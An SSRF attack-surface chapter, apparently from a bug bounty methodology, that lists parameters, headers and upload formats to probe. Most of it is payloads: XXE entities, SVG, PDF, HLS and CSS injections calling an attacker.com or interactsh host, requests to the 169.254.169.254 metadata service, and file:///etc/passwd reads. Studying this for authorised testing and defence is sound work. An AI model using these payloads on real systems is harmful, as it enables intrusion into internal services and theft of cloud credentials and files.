# 01 — Attack Surface Mapping

## 1.1 Direct URL Parameters (Most Common)

### Standard Parameter Names to Fuzz
```
# Query string
url= uri= src= href= path= link= redirect= callback= return= next=
image= image_url= avatar= photo= logo= icon= cover= thumbnail=
feed= rss= sitemap= endpoint= api= proxy= load= fetch= resource=
file= document= report= page= destination= forward= location=
webhook= hook= notify= ping= target= service= backend= origin=
media= attachment= asset= content= template= format= include=
data= source= request= address= domain= host= site= web= ref=

# Headers worth testing
X-Forwarded-For X-Forwarded-Host X-Real-IP X-Remote-Addr
X-Original-URL X-Rewrite-URL X-Custom-IP-Authorization
Referer Origin True-Client-IP CF-Connecting-IP
X-ProxyUser-Ip Client-IP
```

### JSON Body Patterns
```json
{"url": "http://attacker.com"}
{"image_url": "http://attacker.com"}
{"webhook_url": "http://attacker.com"}
{"callback_url": "http://attacker.com"}
{"redirect_uri": "http://attacker.com"}
{"endpoint": "http://attacker.com"}
{"uri": "http://attacker.com"}
{"fetch_url": "http://attacker.com"}
{"resource": "http://attacker.com"}
{"import_url": "http://attacker.com"}
```

---

## 1.2 Webhook Features (Extremely High-Yield)

Webhooks are the #1 source of SSRF findings in public BBP reports.

**Where to find them:**
- Settings → Integrations / Webhooks
- CI/CD pipeline notification URLs (GitHub Actions, GitLab, Jenkins)
- Payment processors (Stripe, PayPal IPN URLs)
- E-commerce order notification webhooks
- Monitoring alert destinations (PagerDuty, OpsGenie integrations)
- Messaging platform integrations (Slack, Teams, Discord bots)
- CRM event webhooks (Salesforce, HubSpot)

**Testing approach:**
1. Set the webhook URL to your Collaborator/interactsh host
2. Trigger the webhook event (create order, push commit, etc.)
3. Observe full HTTP request hitting your listener — this confirms the server-side fetch
4. Now replace with `http://169.254.169.254/` — if a callback fires, you have SSRF

**Known public report patterns:**
- Shopify: Webhook URL → SSRF to internal GCP metadata (disclosed 2019, $25k)
- GitLab: `import_url` for repository mirroring → SSRF to internal services
- HackerOne: Invitation email system SSRF via `X-Forwarded-For`
- Jira: Issue collector URL → blind SSRF

---

## 1.3 File Upload → URL Fetch Features

### Import by URL
Many "upload" features accept a URL and fetch it server-side:
```
POST /api/import
{"type": "url", "source": "http://attacker.com/file.jpg"}

POST /upload
Content-Type: multipart/form-data
file_url=http://attacker.com/document.pdf

GET /proxy?url=https://cdn.example.com/image.jpg
```

### SVG Uploads
SVG files can embed external resource requests:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://YOUR.INTERACTSH.HOST/svg-ssrf" width="100" height="100"/>
  <text>&xxe;</text>
</svg>
```

### DOCX / XLSX / ODT Uploads (OLE/XML formats)
These are ZIP archives containing XML. Inject external entities:
```xml
<!-- word/_rels/document.xml.rels -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR.INTERACTSH.HOST/docx-ssrf">]>
<Relationships>
  <Relationship Target="http://YOUR.INTERACTSH.HOST/docx-ssrf" TargetMode="External"/>
</Relationships>
```

### PDF Upload / Rendering (wkhtmltopdf / Headless Chrome)
If the app converts HTML to PDF on the server side, it often follows `<img>`, `<link>`, `<script>` tags:
```html
<!-- Inject into any HTML-to-PDF input -->
<img src="http://YOUR.INTERACTSH.HOST/pdf-ssrf">
<script src="http://YOUR.INTERACTSH.HOST/pdf-ssrf-js"></script>
<link rel="stylesheet" href="http://YOUR.INTERACTSH.HOST/pdf-ssrf-css">
<!-- iframe works in wkhtmltopdf -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

**wkhtmltopdf-specific:**
```html
<!-- File read via SSRF -->
<iframe src="file:///etc/passwd"></iframe>
<!-- Internal service access -->
<iframe src="http://127.0.0.1:8080/admin"></iframe>
```

### FFmpeg Video Processing (HLS Injection)
Create a malicious `.m3u8` playlist file and upload it:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://YOUR.INTERACTSH.HOST/ffmpeg-ssrf/
#EXT-X-ENDLIST
```

Or an AVI file with a malicious HLS reference — use the `ffmpeg` SSRF toolkit from 0xacb.

### ImageMagick (SSRF via `@` prefix in filenames)
```
filename=@http://169.254.169.254/latest/meta-data/
POST /resize?url=http://attacker.com/image.jpg%0A%0aHost:%20169.254.169.254
```

---

## 1.4 PDF / Screenshot / Thumbnail Generators

These are among the highest-impact SSRF vectors because the renderer makes full HTTP requests:

**Identification patterns:**
```
POST /api/screenshot {"url": "https://example.com"}
GET /thumbnail?url=https://example.com/image.jpg
POST /export/pdf {"content": "<html>...", "url": "..."}
GET /og-image?url=https://... (Open Graph preview generators)
GET /embed?url=https://... (link preview services)
```

**Payloads for these:**
```
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
http://0.0.0.0:22/ (service banner probe)
http://[::]:80/ (IPv6)
```

---

## 1.5 XML / XXE → SSRF (Indirect SSRF)

Anywhere the app parses XML, SSRF can be triggered via external entities.

**Standard XXE to SSRF:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://YOUR.INTERACTSH.HOST/xxe-ssrf">
]>
<root>
  <data>&ssrf;</data>
</root>
```

**Parameter entity (for blind XXE → SSRF):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR.INTERACTSH.HOST/xxe.dtd">
  %remote;
]>
<foo/>
```

**SOAP endpoints:**
```xml
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR.INTERACTSH.HOST/">]>
  <s:Body><data>&xxe;</data></s:Body>
</s:Envelope>
```

---

## 1.6 OAuth / SSO Redirect Parameters

```
GET /oauth/authorize?redirect_uri=http://attacker.com HTTP/1.1
GET /login?return_to=http://attacker.com
GET /auth/callback?next=http://attacker.com
POST /sso {"callback": "http://attacker.com"}
```

If the server-side validates the callback by fetching it (e.g., to verify it's reachable), this becomes SSRF. Some OAuth implementations pre-fetch the redirect URI.

---

## 1.7 Cloud / Infrastructure Integration Forms

Configuration forms that test connectivity are extremely prone:

**Examples:**
```
# Jira / Confluence
POST /rest/webhooks/1.0/webhook
{"url": "http://169.254.169.254/latest/meta-data/", "events": ["jira:issue_created"]}

# Kubernetes / Docker Registry
{"registry_url": "http://169.254.169.254/latest/meta-data/"}

# SMTP configuration (test email)
{"smtp_host": "169.254.169.254", "smtp_port": 25}

# Database connection (PostgreSQL, MySQL)
{"host": "169.254.169.254", "port": 5432}

# LDAP / Active Directory
{"ldap_url": "ldap://169.254.169.254:389"}

# S3-compatible storage
{"endpoint_url": "http://169.254.169.254/"}
```

---

## 1.8 HTTP Header Injection → SSRF

Some applications use headers to determine backend routing:

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: 169.254.169.254
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
X-Original-URL: http://169.254.169.254/latest/meta-data/
X-Rewrite-URL: http://169.254.169.254/latest/meta-data/
True-Client-IP: 169.254.169.254
```

**Host header SSRF (common in load balancers / reverse proxies):**
```http
GET /admin HTTP/1.1
Host: 169.254.169.254
```

---

## 1.9 Less Obvious / Creative Vectors (Public Report-Derived)

### CSS `@import` and `url()` in user-submitted CSS
```css
@import url("http://YOUR.INTERACTSH.HOST/css-ssrf");
body { background: url("http://YOUR.INTERACTSH.HOST/css-bg"); }
```

### Markdown Rendering with Remote Image Support
```markdown
![ssrf](http://YOUR.INTERACTSH.HOST/md-ssrf)
[link](http://YOUR.INTERACTSH.HOST/md-link)
```

### Jupyter Notebook / Code Execution Environments
```python
# If the app executes user code server-side
import urllib.request
urllib.request.urlopen("http://169.254.169.254/latest/meta-data/")
```

### GraphQL — `@url` directives, subscriptions, `link` fields
```graphql
query {
  fetchRemote(url: "http://169.254.169.254/latest/meta-data/") {
    content
  }
}
```

### Email template rendering (HTML emails with external resources)
```html
<!-- In newsletter templates / transactional email editors -->
<img src="http://169.254.169.254/latest/meta-data/" />
```

### Sitemap.xml / robots.txt fetching
If the app verifies ownership by fetching a file you control at a URL, test with internal paths.

### Archive extraction (zip slip → SSRF symlink)
Create a zip containing a symlink pointing to `/etc/passwd` or internal HTTP endpoint.

### SSRF via Referer header in analytics
Some apps log the Referer and later fetch it for analytics purposes.

### S3 / GCS presigned URL generation
If the user controls the bucket name or key prefix parameter, test with `@169.254.169.254` bucket names.

### Custom font loading (CSS `@font-face`)
```css
@font-face {
  font-family: 'evil';
  src: url('http://169.254.169.254/latest/meta-data/');
}
```

### Server-side HTML template rendering (SSTI → SSRF)
If you find SSTI in Jinja2/Twig/Freemarker, use template syntax to make HTTP requests.
